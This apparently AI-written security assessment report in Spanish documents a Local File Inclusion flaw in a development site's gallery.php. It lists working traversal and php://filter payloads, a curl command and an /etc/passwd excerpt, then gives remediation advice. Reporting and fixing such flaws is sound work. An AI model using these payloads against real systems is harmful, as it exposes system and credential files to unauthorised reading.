# Informe de análisis LFI — 2026-04-18T17:54:28

Objetivo: http://web.dev.local:8081
Fecha: 2026-04-18T17:54:28Z
Analista: Copilot (GPT-5 mini)

Resumen ejecutivo
-----------------
Se detectó y explotó una vulnerabilidad Local File Inclusion (LFI) en la página gallery.php mediante el parámetro `page`. Fue posible leer /etc/passwd y obtener código fuente a través del wrapper `php://filter`.

Evidencia
---------
1) Lectura de /etc/passwd (fragmento):

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

2) Lectura de código (base64 obtenido con php://filter, fragmento):

```
PD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRwYWdlKTsgPz4=
```
(esto corresponde a fragmentos de PHP en el fichero incluido)

Payloads y comandos utilizados
-----------------------------
- /gallery.php?page=../../../../../../etc/passwd
- /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php

Ejemplo de comando curl:

curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"

Impacto
-------
Alta: exposición de archivos sensibles (credenciales, configuraciones) y posible obtención de código fuente que facilita escalación a ejecución remota.

Recomendaciones
---------------
1. Evitar incluir ficheros directamente desde parámetros de usuario. Usar un mapeo de nombres permitidos a rutas internas (whitelist).
2. Normalizar y validar entradas (basename, realpath) y comprobar que el fichero resultante está dentro de un directorio permitido.
3. Desactivar wrappers peligrosos y revisa `allow_url_include` si aplica.
4. Limitar accesos con open_basedir y permisos de fichero correctos.
5. Revisar logs y rotación de contraseñas/credenciales si procede.

Conclusión
----------
Vulnerabilidad LFI confirmada y explotada con éxito. Se recomienda corrección inmediata siguiendo las medidas indicadas.

Archivos generados durante el análisis
-------------------------------------
- /tmp/lfi_results.txt (evidencia cruda)


